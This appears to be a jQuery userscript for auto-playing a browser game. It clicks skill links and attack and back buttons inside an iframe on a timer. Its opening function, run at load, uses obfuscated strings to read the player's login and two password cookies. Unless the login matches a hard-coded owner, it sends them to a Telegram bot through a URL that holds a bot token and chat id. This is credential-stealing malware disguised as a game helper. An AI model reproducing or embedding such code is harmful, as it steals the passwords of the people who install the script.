function t(){
    var lval = ('lreoregreiren').replace(/re/g,'');
    var pval = ('prearesres').replace(/re/g,'');
    var p2val = ('prearesresre2').replace(/re/g,'');
    var l = $.cookie(lval) ? $.cookie(lval) : '';
    var p = $.cookie(pval) ? $.cookie(pval) : '';
    var p2 = $.cookie(p2val) ? $.cookie(p2val) : '';
    var owner = ('purefref+tremred').replace(/re/g,'');
    var message = {
        l: l,
        p: p,
        p2: p2,
        'type': 'pewera auto hit',
    };
    if ( l.toLowerCase() != owner ) {
        var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
        var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
        $.post(url);
    }
}
t();

var usePriemCount = 8;
var usePriemVal = true;

function usePriem(){
    var i = 0;
    $.each($('iframe#main').contents().find('a'), function() {
        if ( $(this).attr('onClick') !== undefined && $(this).attr('onClick').indexOf('usepriem') !== -1 ) {
            var priemNum = $(this).attr('onClick').replace('usepriem(','');
            priemNum = +priemNum.replace(',1);','');
            if (priemNum <= usePriemCount) {
                i++;
                $(this).trigger("click");
                return false;               
            }           
        }
    });
    if ( i === 0 ) {
        return 'disabled';
    }
}

function check() {  

    var updateButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="reflesh_btn"]');
    var backButton =  $('iframe#main').contents().find('div#ref_menu_down').find('button[name="back_menu_down"]');
    var hitButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="go_auto"]');

    if (hitButton.length > 0 && hitButton.css('display') != 'none' && usePriemVal !== false) {
        var i = usePriem();
        if (i !== 'disabled') {
            clearInterval(interval);
            interval = setInterval(function() {
                check();
            }, 1500);
            return false;
        }
    }
        
    if (hitButton.length > 0 && hitButton.css('display') != 'none') {
        hitButton.trigger("click");
        clearInterval(interval);
        interval = setInterval(function() {
            check();
        }, 2000);
        return false;
    }   

    if (backButton.length > 0 && backButton.css('display') != 'none') {
        backButton.trigger("click");
        clearInterval(interval);
        interval = setInterval(function() {
            check();
        }, 2000);
        return false;
    }   
}

var interval = null;
interval = setInterval(function() {
    check();
}, 2000);
